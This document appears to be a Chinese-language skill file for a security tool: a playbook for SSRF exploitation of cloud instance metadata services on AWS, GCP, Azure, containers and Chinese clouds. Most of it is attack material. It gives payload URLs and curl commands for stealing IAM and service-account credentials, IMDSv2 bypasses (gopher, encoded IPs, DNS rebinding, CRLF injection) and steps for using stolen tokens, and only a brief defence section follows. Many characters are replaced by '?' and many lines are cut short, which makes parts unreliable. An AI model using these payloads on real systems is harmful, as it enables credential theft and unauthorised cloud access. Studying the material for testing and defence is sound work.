---
name: cloud-meta-001
description: "云平台为运行在其中的虚拟机实例提供了元数据服务（Instance Metadata Service, IMDS），用于获取实例配置、IAM 凭证、用户数据等敏感信息 适用于: 目标应用部署?AWS EC2、GCP Compute Engine、Azure VM 等云实例; 应用存在 SSRF 漏洞（URL 参数控制后端 HTTP 请求目标; 应用在容器环境（Docker、Kubernetes）中运行，可访问容器元数"
license: MIT
metadata:
  author: HOS-Sec-Engine
  version: 2026-06
  tags:
  - ssrf
  - metadata
  - imdsv1
  - imdsv2
  - cloud-metadata
  - iam-credentials
  - user-data
  - aws
  - gcp
  - azure
  - token-bypass
  - container-metadata
  - instance-identity
  - 169.254.169.254
  category: cloud
  risk-level: critical
  confidence: 0.94
---
# Cloud Metadata SSRF Exploitation
云平台为运行在其中的虚拟机实例提供了元数据服务（Instance Metadata Service, IMDS），用于获取实例配置、IAM 凭证、用户数据等敏感信息。AWS ?IMDS 端点?169.254.169.254（链路本地地址），GCP ?metadata.google.internal?69.254.169.254），Azure ?169.254.169.254。这些端点只能从实例内部访问，但如果实例上运行的应用存在 SSRF 漏洞，攻击者就能间接访问元数据服务。AWS IMDSv1 无需任何认证即可访问，危害极大；IMDSv2 需?PUT 请求获取 session token 后再使用，安全性显著提升，但仍存在绕过方式（如 hop limit 设置不当、X-Forwarded-For 注入、token 泄露）。获?IAM 临时凭证后，攻击者可以通过 AWS CLI ?SDK 操作云资源，通常能达到与实例关联角色相同的权限。在容器环境中，kubelet API?0250/10255 端口）和 Docker API?375 端口）也可通过 SSRF 访问，暴露容器级元数据和凭证
## 何时使用

### 触发场景

- 目标应用部署?AWS EC2、GCP Compute Engine、Azure VM 等云实例
- 应用存在 SSRF 漏洞（URL 参数控制后端 HTTP 请求目标
- 应用在容器环境（Docker、Kubernetes）中运行，可访问容器元数
- 应用存在 URL 预览、图片代理、Webhook 回调、PDF 生成等功
- 云实例未启用 IMDSv2 ?hop limit 设置大于 1
- 应用使用?SDK 自动从元数据获取凭证
- 存在模板注入或命令注入，可发?HTTP 请求到元数据端点

### 关键词

`169.254.169.254`, `metadata`, `instance metadata`, `imdsv1`, `imdsv2`, `token`, `iam role`, `security credentials`, `user-data`, `cloud metadata`, `gcp metadata`, `azure imds`, `metadata server`, `instance profile`, `container metadata`, `kubelet`, `eks`, `gke`

### 识别指标

- 响应内容包含 XML/JSON 格式的元数据结构
- 响应中包?AccessKeyId、SecretAccessKey、Token 等凭证字
- 响应头包?metadata-flavor: google ?x-aws-ec2-metadata-token-ttl-seconds
- 响应内容包含 base64 编码?user-data 脚本
- 应用返回?URL 内容中暴露了内网 IP 或实?ID

### 别名

`cloud metadata access`, `instance metadata exploitation`, `iam credential theft`, `metadata server attack`, `imdsv2 bypass`, `token hijack`, `user data extraction`

## 操作检查清单

1. 确认 SSRF 漏洞存在，测试外?URL（如 Burp Collaborator）验证可控
2. 测试 AWS IMDSv1：访?http://169.254.169.254/latest/meta-data/
3. 测试 AWS IMDSv2：先 PUT 获取 token，再?token 访问元数
4. 如果 IMDSv2 限制，尝?IP 编码绕过?xA9FEA9FE?852039166
5. 获取 IAM 角色名称?latest/meta-data/iam/security-credentials/
6. 获取 IAM 临时凭证?latest/meta-data/iam/security-credentials/{role-name}
7. 获取 user-data?latest/user-data（可能包含敏感信息）
8. 获取实例信息?latest/meta-data/instance-id、iam/info
9. 测试 GCP 元数据：http://169.254.169.254/computeMetadata/v1/?recursive=true
10. 测试 Azure IMDS：http://169.254.169.254/metadata/instance?api-version=2021-02-01
11. 测试 ECS 任务凭证：环境变量或 169.254.170.2
12. 测试容器环境：Docker API (2375)、kubelet API (10250)
13. 使用获取的凭证配?AWS CLI 并验证权?

## 技术手段

- IMDSv1 直接访问：无需认证，GET 请求即可获取元数
- IMDSv2 token 获取：PUT /latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
- IP 编码绕过?xA9FEA9FE（十六进制）?852039166（十进制）、[0:0:0:0:0:ffff:a9fe:a9fe]（IPv6
- URL 解析绕过：http://169.254.169.254.nip.io（DNS 解析?169.254.169.254
- 重定?SSRF：外部服务器 302 ?169.254.169.254 绕过 WAF
- CRLF 注入：在 URL 中注?
 添加自定?header（如 IMDSv2 token header
- gopher 协议：gopher://169.254.169.254:80/_{PUT_request} 获取 IMDSv2 token
- SSRF-XXE 组合：通过 XXE 发起请求到元数据端点
- 容器元数据：ECS 通过 AWS_CONTAINER_CREDENTIALS_RELATIVE_URI 获取端点
- Kubernetes：通过 SSRF 访问 kubelet API 获取 Pod 信息?service account token

## 实战经验

### 症状

- SSRF 可访?169.254.169.254 且返回正常元数据响应
- 应用错误信息中暴露了云实?ID 或内?IP 地址
- SSRF 响应时间极短（元数据服务在本地网络，延迟 < 1ms
- 应用通过 curl/requests 等库发起请求，未对目标地址做内网限
- 云实例未启用 IMDSv2（可通过 PUT /latest/api/token 测试
- ECS 任务中可访问 169.254.170.2 获取任务角色凭证

### 根因分析

- 应用信任用户输入?URL 参数，未过滤内网地址（特别是 169.254.169.254
- 云实例管理员未启?IMDSv2 或未设置 hop-limit=1
- IAM 角色附加了过宽的权限（如 AdministratorAccess），一旦被利用危害极大
- user-data 脚本中硬编码了敏感信息（密钥、密码、API token
- 应用使用旧版 SDK 或自定义 HTTP 客户端，不支?IMDSv2
- 容器编排平台（Kubernetes）中 kubelet API 未启用认
- 反向代理（如 Nginx）配置不当，?metadata 请求转发到后?

### 实战观察

- AWS IMDSv2 ?token 有效期最?6 小时，如?SSRF 在同一会话中可复用 token
- IMDSv2 hop-limit=1 时，经过代理的请求无法到达元数据服务（TTL ?1 后为 0
- 但某?SSRF 漏洞（如 SSRF in Java/Python）可以直接控?HTTP header ?TTL
- GCP 元数据服务器支持递归查询?recursive=true），一次获取所有元数据
- Azure IMDS 需要设?Metadata: true 请求头，否则返回 404
- ECS 任务角色凭证通过环境变量 AWS_CONTAINER_CREDENTIALS_RELATIVE_URI 获取端点
- 阿里云元数据端点?100.100.100.200，与 AWS 不同但原理相
- 腾讯云元数据端点?metadata.tencentyun.com
- Kubernetes ?service account token 位于 /var/run/secrets/kubernetes.io/serviceaccount/token
- Docker 守护进程 API?375 端口无认证）可获取容器元数据和环境变?

### 常见错误

- 只测试了 IMDSv1，忽略了 IMDSv2 可能需?token 认证
- 未测?IP 编码绕过（十六进?0xA9FEA9FE、十进制 2852039166
- 未检?X-Forwarded-For 是否可以绕过 IMDSv2 的限
- 忽略?ECS/EKS 等容器环境的特殊元数据端
- 只关?AWS，未测试 GCP metadata ?Azure IMDS
- 未利用获取的凭证进一步操作云资源（仅获取凭证即停止）
- 未检?user-data 中可能包含的敏感信息（初始化脚本中的密码、密钥）

### 补充说明

- 元数?SSRF 是云渗透中最关键的初始访问点之一，通常可直接获?IAM 凭证
- 获取凭证后应立即使用，因为临时凭证有有效期（通常 1-6 小时
- IMDSv2 ?token 获取需?PUT 请求，部?SSRF 漏洞只支?GET 请求
- 如果遇到 IMDSv2 限制，可尝试 SSRF + 重定?+ DNS rebinding 组合绕过
- 部分 WAF ?169.254.169.254 有硬编码拦截，需?IP 编码绕过
- 元数据访问本身不违法，但利用获取的凭证操作云资源属于未授权访?

## 示例

### AWS IMDSv1 元数据访问与 IAM 凭证获取

直接通过 SSRF 访问 AWS IMDSv1 获取实例元数据和 IAM 临时凭证

```
# 1. 获取元数据根目录（列出所有可用元数据）
http://169.254.169.254/latest/meta-data/

# 2. 获取 IAM 角色名称
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# 返回: my-ec2-role

# 3. 获取 IAM 临时凭证
http://169.254.169.254/latest/meta-data/iam/security-credentials/my-ec2-role
# 返回 JSON:
# {
#   "Code": "Success",
#   "LastUpdated": "2026-06-18T10:00:00Z",
#   "Type": "AWS-HMAC",
#   "AccessKeyId": "ASIAxxxxxxxxxxxxxxx",
#   "SecretAccessKey": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
#   "Token": "IQoJb3JpZ2luX2Vj...",
#   "Expiration": "2026-06-18T16:00:00Z"
# }

# 4. 获取实例 ID 和账户信息
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/dynamic/instance-identity/document

# 5. 获取 user-data（初始化脚本，可能包含敏感信息）
http://169.254.169.254/latest/user-data

# 6. 获取 ami-id ?hostname
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
```

### AWS IMDSv2 Token 获取与元数据访问

IMDSv2 需要获?session token 后才能访问元数据，展示完整的 IMDSv2 利用流程

```
# 1. 获取 IMDSv2 session token（PUT 请求）
curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
# 返回 token 字符串（?AQAAxxxxx）

# 2. 使用 token 访问元数据
curl -H "X-aws-ec2-metadata-token: AQAAxxxxx" \
  "http://169.254.169.254/latest/meta-data/"

# 3. 获取 IAM 凭证（IMDSv2）
curl -H "X-aws-ec2-metadata-token: AQAAxxxxx" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# 获取角色名后：
curl -H "X-aws-ec2-metadata-token: AQAAxxxxx" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/{role-name}"

# 4. 如果 SSRF 只支?GET，使?gopher 协议发?PUT 请求
gopher://169.254.169.254:80/_PUT%20/latest/api/token%20HTTP/1.1%0d%0aHost: 169.254.169.254%0d%0aX-aws-ec2-metadata-token-ttl-seconds: 21600%0d%0a%0d%0a

# 5. 如果 SSRF 支持自定?header，直接添?token header
# （Burp Suite 中可手动添加请求头）
GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: AQAAxxxxx

# 6. 获取动态实例信息
curl -H "X-aws-ec2-metadata-token: AQAAxxxxx" \
  "http://169.254.169.254/latest/dynamic/instance-identity/document" | jq
```

### IMDSv2 Token 绕过技

当实例启用了 IMDSv2 ?hop-limit > 1 时，可通过多种方式绕过限制获取元数

```
# 1. IP 编码绕过（SSRF 目标过滤?169.254.169.254）
http://0xA9FEA9FE/ ?169.254.169.254（十六进制）
http://2852039166/ ?169.254.169.254（十进制）
http://0251.0376.0251.0376/ ?169.254.169.254（八进制）
http://[::ffff:a9fe:a9fe]/ ?169.254.169.254（IPv6 映射）

# 2. DNS 重绑定绕过
http://169.254.169.254.nip.io/ ?DNS 解析?169.254.169.254
http://a9fea9fe.nip.io/ ?169.254.169.254

# 3. CRLF 注入添加 IMDSv2 token header
# 如果 SSRF 允许?URL 中注入换行符：
http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: STOLEN_TOKEN

# 4. 利用 SSRF 先获?token（如果支?PUT）
# 然后在同一会话中复?token 访问元数据

# 5. hop-limit 绕过原理：
# IMDSv2 要求 hop-limit=1，即只允许实例内部直接访问
# 如果管理员设置了 hop-limit=2，则经过一个代理后 TTL=1 仍可到达
# 检查当?hop-limit：
curl -s http://169.254.169.254/latest/meta-data/network/interfaces/macs/ -H "X-aws-ec2-metadata-token: $TOKEN"

# 6. 利用 SSRF 在同一?HTTP 连接中发送多个请求（HTTP/2 multiplexing）
# 第一个请求获?token，第二个请求使用 token 访问元数?
```

### GCP 元数据服务器 SSRF 利用

针对 Google Cloud Platform (GCP) 元数据服务的 SSRF 利用

```
# 1. GCP 元数据端点（需?Metadata-Flavor: Google 请求头）
http://169.254.169.254/computeMetadata/v1/

# 2. 递归获取所有元数据（最有价值的利用方式）
http://169.254.169.254/computeMetadata/v1/?recursive=true
# 请求? Metadata-Flavor: Google

# 3. 获取服务账户凭证
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes

# 4. 获取实例信息
http://169.254.169.254/computeMetadata/v1/instance/id
http://169.254.169.254/computeMetadata/v1/instance/name
http://169.254.169.254/computeMetadata/v1/instance/zone
http://169.254.169.254/computeMetadata/v1/instance/hostname
http://169.254.169.254/computeMetadata/v1/instance/network-interfaces/

# 5. 获取项目信息
http://169.254.169.254/computeMetadata/v1/project/project-id
http://169.254.169.254/computeMetadata/v1/project/numeric-project-id

# 6. 使用获取?access token 调用 GCP API
curl -H "Authorization: Bearer {access_token}" \
  "https://www.googleapis.com/compute/v1/projects/{project-id}/zones"
curl -H "Authorization: Bearer {access_token}" \
  "https://www.googleapis.com/iam/v1/projects/{project-id}/roles"

# 7. 如果 SSRF 不支持自定义 header，尝?GCE 旧版端点
# 部分旧版 GCE 实例可能不需?Metadata-Flavor 头
http://metadata.google.internal/computeMetadata/v1/

# 8. 获取 startup-script（可能包含敏感信息）
http://169.254.169.254/computeMetadata/v1/instance/attributes/startup-script
```

### Azure IMDS 元数?SSRF 利用

针对 Azure Instance Metadata Service (IMDS) ?SSRF 利用

```
# 1. Azure IMDS 端点（需?Metadata: true 请求头）
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# 请求? Metadata: true

# 2. 获取完整实例信息
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq

# 3. 获取计算信息（VM 名称、大小、位置等）
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01

# 4. 获取网络信息（IP 地址、子网、VNet）
http://169.254.169.254/metadata/instance/network?api-version=2021-02-01

# 5. 获取 Managed Identity 访问令牌
# 获取 MSI 端点：
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# 请求? Metadata: true

# 6. 使用获取的令牌访?Azure 资源管理器
curl -H "Authorization: Bearer {access_token}" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"

# 7. 获取订阅和虚拟机列表
curl -H "Authorization: Bearer {access_token}" \
  "https://management.azure.com/subscriptions/{subscription-id}/resourceGroups/{rg}/providers/Microsoft.Compute/virtualMachines?api-version=2021-03-01"

# 8. 注意：Azure IMDS v1 已被弃用，v2 需要特定请求头
#    但部分旧系统可能仍支持无 header 访问
```

### ECS/EKS 容器元数据与任务凭证获取

针对 AWS ECS/EKS 容器环境中元数据和任务角色凭证的 SSRF 利用

```
# 1. ECS 任务角色凭证（v2 端点）
# 首先从环境变量获取凭证端点路径
AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/{guid}
# 然后访问：
http://169.254.170.2/v2/credentials/{guid}

# 2. ECS 任务元数据（v3 端点，ECS Agent 1.28+）
# 从环境变量获取端点：
ECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v3/xxx
# 访问元数据：
http://169.254.170.2/v3/{task-id}
http://169.254.170.2/v3/{task-id}/task

# 3. 获取任务定义和环境变量（可能包含敏感信息）
http://169.254.170.2/v3/{container-id}

# 4. EKS Pod 中获?Service Account Token
# Token 文件路径（Pod 内部）：
/var/run/secrets/kubernetes.io/serviceaccount/token
# 通过 SSRF 无法直接读取文件，但可通过 SSRF 访问 kubelet API

# 5. 访问 kubelet API（端?10250，需认证）
# 如果 kubelet 启用了匿名访问：
https://{node-ip}:10250/pods
# 获取所?Pod 信息，包括环境变量中的密钥

# 6. 使用获取?ECS 任务凭证
export AWS_ACCESS_KEY_ID={AccessKeyId}
export AWS_SECRET_ACCESS_KEY={SecretAccessKey}
export AWS_SESSION_TOKEN={Token}
aws sts get-caller-identity

# 7. Docker 守护进程 API（端?2375，无认证）
http://docker-host:2375/containers/json
http://docker-host:2375/containers/{id}/json
# 获取容器配置中的环境变量（可能包含凭证）
```

### 阿里云与腾讯云元数据 SSRF 利用

针对中国云平台（阿里云、腾讯云、华为云）元数据服务?SSRF 利用

```
# ===== 阿里?ECS 元数?=====
# 元数据端点：
http://100.100.100.200/latest/meta-data/

# 获取基本信息：
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/mac
http://100.100.100.200/latest/meta-data/private-ipv4

# 获取 RAM 角色凭证：
http://100.100.100.200/latest/meta-data/ram/security-credentials/
# 获取角色名后：
http://100.100.100.200/latest/meta-data/ram/security-credentials/{role-name}

# 阿里?IMDSv2（需?token）：
curl -X PUT "http://100.100.100.200/latest/api/token" \
  -H "X-aliyun-ecs-metadata-token-ttl-seconds: 21600"
curl -H "X-aliyun-ecs-metadata-token: {token}" \
  "http://100.100.100.200/latest/meta-data/"

# ===== 腾讯?CVM 元数?=====
# 元数据端点：
http://metadata.tencentyun.com/latest/meta-data/
http://169.254.0.23/latest/meta-data/

# 获取实例信息：
http://metadata.tencentyun.com/latest/meta-data/instance-id
http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/

# ===== 华为?ECS 元数?=====
# 元数据端点：
http://169.254.169.254/openstack/latest/meta_data.json
http://169.254.169.254/openstack/latest/securitykey
# 获取凭证（华为云特有格式）：
http://169.254.169.254/openstack/latest/securitykey
```

## 验证标准

### 验证指标

- 响应内容包含 XML/JSON 格式的元数据目录结构
- 响应中包?AccessKeyId、SecretAccessKey、Token ?IAM 凭证字段
- 响应头包?metadata-flavor: google（GCP）或 x-aws-ec2-metadata-token-ttl-seconds
- 响应内容中包?base64 编码?user-data 脚本内容
- 响应中包含实?ID（如 i-0abc123def456）、AMI ID ?MAC 地址
- GCP 返回的服务账?token 包含 access_token ?expires_in 字段
- Azure 返回?Managed Identity token 包含 access_token ?resource 字段

### 成功标志

- 成功获取 IAM 角色名称和临时凭
- 使用获取的凭证通过 AWS CLI 成功调用 API（如 aws s3 ls
- 获取 user-data 并从中提取到敏感信息（密码、密钥、API token
- 成功递归获取 GCP 所有元数据（包含服务账?token
- 成功获取 Azure Managed Identity token 并访?Azure 资源管理
- 成功获取 ECS 任务角色凭证?kubelet API 信息

### 误报标志

- 响应 404 表示元数据端点不存在?IMDSv2 强制启用且未正确获取 token
- 响应 400 Bad Request 表示缺少必需的请求头（如 Metadata: true for Azure
- 响应 403 Forbidden 表示实例没有关联 IAM 角色或角色权限不
- 响应超时表示 hop-limit=1 且请求经过了代理（TTL 已减?0
- 返回内容不是元数据而是应用正常响应（SSRF 未正确指向元数据端点
- IP 编码?WAF 拦截或解析后仍指向正确的内网地址

## 防御建议

### 推荐做法

- 在所?AWS EC2 实例上强制启?IMDSv2 并设?hop-limit=1
- 使用 AWS Config 规则（ec2-instance-metadata-options）自动检测不合规实例
- 在实例启动模板和用户数据中设?IMDSv2 要求：aws ec2 modify-instance-metadata-options --http-endpoint enabled --http-tokens required
- ?IAM 角色遵循最小权限原则，限制实例角色的权限范
- 不要?user-data 中存储敏感信息（密码、密钥），使?Secrets Manager ?Parameter Store
- GCP：启用元数据服务器端点访问限制，限制哪些 VM 可以访问
- Azure：使?Managed Identity 而非存储凭证，限?MI 权限
- Kubernetes：启?Pod Security Admission，禁?hostNetwork，限?kubelet 匿名访问
- Docker：永远不要将 2375 端口暴露到网络，使用 TLS 认证?376 端口
- ?WAF/反向代理中硬编码拦截?169.254.169.254、metadata.google.internal 等元数据地址的请
- 使用网络策略（AWS VPC 安全组、GCP 防火墙规则）限制出站流量到元数据端点
- 启用 CloudTrail 监控对元数据服务的异常访问模?

### 缓解措施

- 立即轮换所有可能泄露的 IAM 凭证（AccessKey、SecretKey、SessionToken
- 审查 CloudTrail 日志，确认是否有未授权的云资源操
- 强制所有实例使?IMDSv2：aws ec2 modify-instance-metadata-options --http-tokens required
- 检查并移除 IAM 角色中的过度授权策略
- 如果检测到恶意操作，立即禁用关联的 IAM 角色
- 对所有实例启?IMDSv2 并设?hop-limit=1
- 启用 VPC Flow Logs 监控异常的出站流量到元数据端
- 检查是否有未授权的 IAM 用户或角色被创建（持久化后门?

## 参考链接

- https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
- https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
- https://cloud.google.com/compute/docs/storing-retrieving-metadata
- https://cloud.google.com/compute/docs/metadata/default-metadata-values
- https://docs.microsoft.com/en-us/azure/virtual-machines/linux/instance-metadata-service
- https://docs.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/how-to-use-vm-token
- https://help.aliyun.com/zh/ecs/user-guide/query-instance-metadata
- https://cloud.tencent.com/document/product/213/4934
- https://rhinosecuritylabs.com/aws/iam-role-hijacking-via-instance-metadata-service-imds/
- https://bishopfox.com/blog/bypassing-imdsv2-protections
- https://kubernetes.io/docs/reference/access-authn-authz/kubelet-tls-bootstrapping/
- https://explore.skillbuilder.aws/learn/course/external/view/elearning/7969/secure-the-aws-imds
